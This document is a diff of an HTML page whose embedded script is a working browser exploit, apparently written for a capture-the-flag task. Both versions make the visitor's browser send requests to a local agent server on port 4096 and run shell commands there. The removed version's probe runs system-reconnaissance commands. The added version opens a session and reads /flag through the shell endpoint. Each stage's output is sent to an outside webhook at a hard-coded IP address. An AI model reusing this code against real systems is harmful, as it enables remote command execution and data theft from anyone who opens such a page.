@@ -1,140 +1,67 @@
-  <!doctype html>
-  <meta charset="utf-8">
   <script>
-  (() => {
-  const WEBHOOK = "https://47.118.30.30:9999";
-  const READ_FLAG = false;
-  const TARGETS = [
-    "http://127.0.0.1:4096/pty",
-    "http://localhost:4096/pty",
-  ];
-  const PROBE_ID = `openshell-${Date.now()}-${Math.random().toString(16).slice(2)}`;
-
-  async function fireAndForget(url, body) {
-    try {
-      await fetch(url, {
-        method: "POST",
-        mode: "no-cors",
-        headers: {
-          "Content-Type": "text/plain",
-        },
-        body: typeof body === "string" ? body : JSON.stringify(body),
-        keepalive: true,
-      });
-    } catch {}
-  }
-
-  async function browserBeacon(stage, extra) {
-    const lines = [
-      `stage=${stage}`,
-      `probe_id=${PROBE_ID}`,
-      `href=${location.href}`,
-      `origin=${location.origin}`,
-      `ua=${navigator.userAgent}`,
-    ];
-
-    if (extra) {
-      lines.push(`extra=${JSON.stringify(extra)}`);
-    }
-
-    await fireAndForget(WEBHOOK, lines.join("\n"));
-  }
-
-  function buildNodeProbe() {
-    return String.raw`
-const { execSync } = require("child_process");
-const http = require("http");
-const https = require("https");
-const { URL } = require("url");
-
-const webhook = new URL(${JSON.stringify(WEBHOOK)});
-const probeId = ${JSON.stringify(PROBE_ID)};
-const readFlag = ${READ_FLAG ? "true" : "false"};
-
-function sh(cmd) {
-  try {
-    return execSync(cmd, {
-      encoding: "utf8",
-      stdio: ["ignore", "pipe", "pipe"],
-    });
-  } catch (error) {
-    const stdout = error && error.stdout ? error.stdout.toString() : "";
-    const stderr = error && error.stderr ? error.stderr.toString() : "";
-    const message = error && error.message ? error.message : String(error);
-    return "[error] " + cmd + "\n" + stdout + stderr + message + "\n";
-  }
-}
-
-const out = [];
-out.push("stage=server-side-pty");
-out.push("probe_id=" + probeId);
-out.push("time=" + new Date().toISOString());
-out.push("cwd=" + process.cwd());
-out.push("node=" + process.version);
-out.push("$ id");
-out.push(sh("id"));
-out.push("$ whoami");
-out.push(sh("whoami"));
-out.push("$ uname -a");
-out.push(sh("uname -a"));
-out.push("$ pwd");
-out.push(sh("pwd"));
-out.push("$ ls -la /");
-out.push(sh("ls -la /"));
-out.push("$ ls -la /root");
-out.push(sh("ls -la /root"));
-out.push("$ ls -la /home");
-out.push(sh("ls -la /home"));
-out.push("$ stat /flag");
-out.push(sh("stat /flag"));
-
-if (readFlag) {
-  out.push("$ chmod 644 /flag && cat /flag");
-  out.push(sh("chmod 644 /flag 2>/dev/null; cat /flag 2>/dev/null"));
-}
-
-const body = Buffer.from(out.join("\n\n"));
-const client = webhook.protocol === "https:" ? https : http;
-const req = client.request(
-  webhook,
-  {
-    method: "POST",
-    headers: {
-      "Content-Type": "text/plain",
-      "Content-Length": String(body.length),
-    },
-  },
-  (res) => {
-    res.resume();
-    res.on("end", () => process.exit(0));
-  },
-);
-
-req.on("error", () => process.exit(1));
-req.end(body);
-`;
-  }
-
-  async function launch(target) {
-    const payload = {
-      command: "node",
-      args: ["-e", buildNodeProbe()],
-      title: `probe-${PROBE_ID}`,
-    };
-
-    await fireAndForget(target, payload);
-    await browserBeacon("browser-post-sent", { target });
-  }
-
   (async () => {
-    await browserBeacon("browser-start");
+    const WEBHOOK = "https://47.118.30.30:9999";
+    const BASE = "http://127.0.0.1:4096";
 
-    for (const target of TARGETS) {
-      await launch(target);
+    async function exfiltrate(text) {
+      try {
+        await fetch(WEBHOOK, {
+          method: "POST",
+          mode: "no-cors",
+          headers: { "Content-Type": "text/plain" },
+          body: text,
+          keepalive: true
+        });
+      } catch {}
     }
 
-    await browserBeacon("browser-finished");
-  })();
-})();
+    function summarizeShellResult(rawText) {
+      try {
+        const parsed = JSON.parse(rawText);
+        const output = parsed?.parts?.[0]?.state?.output;
+        if (typeof output === "string" && output.length > 0) {
+          return output;
+        }
+      } catch {}
+      return rawText;
+    }
 
+    try {
+      const healthResp = await fetch(`${BASE}/global/health`);
+      const healthText = await healthResp.text();
+      await exfiltrate(`stage=health\nstatus=${healthResp.status}\n\n${healthText}`);
+
+      const sessionResp = await fetch(`${BASE}/session`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: "{}",
+        credentials: "omit"
+      });
+      const sessionText = await sessionResp.text();
+      const session = JSON.parse(sessionText);
+
+      await exfiltrate(
+        `stage=session\nstatus=${sessionResp.status}\nsession_id=${session.id}\n\n${sessionText}`
+      );
+
+      const shellResp = await fetch(`${BASE}/session/${session.id}/shell`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          agent: "build",
+          command: "chmod 644 /flag && cat /flag"
+        }),
+        credentials: "omit"
+      });
+
+      const shellText = await shellResp.text();
+      const output = summarizeShellResult(shellText);
+
+      await exfiltrate(
+        `stage=flag\nstatus=${shellResp.status}\nsession_id=${session.id}\n\n${output}\n\n[raw]\n${shellText}`
+      );
+    } catch (error) {
+      await exfiltrate(`stage=error\n\n${error && error.stack ? error.stack : String(error)}`);
+    }
+  })();
   </script>
